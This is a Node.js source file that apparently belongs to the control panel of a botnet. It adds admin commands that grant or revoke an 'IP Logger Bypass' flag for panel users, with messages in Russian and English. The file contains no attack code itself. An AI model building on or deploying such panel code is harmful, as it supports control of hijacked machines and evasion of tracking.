const CommandsCore = require('../../core')
const CommonData = require('../../../../common/data')
const center = require('../../../../utils/center')
const Botnet = require('../../../../botnet/core')
const { clearWithLogo } = require('../../../../utils/logo')

CommandsCore.cmdInit(/^\+iplb (.*)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let username = args[1];

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(user.ipLoggerBypass) {
        return client.write(center(`${username} already has IP Logger Bypass.`.red.italic, client.getWidth()) + '\n\n')
    }

    user.ipLoggerBypass = true
    client.write(center(`${username} установлен IP Logger Bypass.`.bgGreen.brightWhite, client.getWidth()) + '\n\n')
})

CommandsCore.cmdInit(/^\-iplb (.*)$/i, async (client, command, args) => {
    if(!client.user.admin) {
        return client.write(center('У вас нет доступа к этой команде.'.red.italic, client.getWidth()) + '\n\n')
    }

    let username = args[1];

    const user = CommonData.users.find(x => x.username === args[1])
    if(!user) {
        return client.write(center('Пользователь не найден.'.red.italic, client.getWidth()) + '\n\n')
    }

    if(!user.ipLoggerBypass) {
        return client.write(center(`${username} doesn't have IP Logger Bypass.`.red.italic, client.getWidth()) + '\n\n')
    }

    user.ipLoggerBypass = false
    client.write(center(`${username} больше не имеет IP Logger Bypass.`.bgRed.brightWhite, client.getWidth()) + '\n\n')
})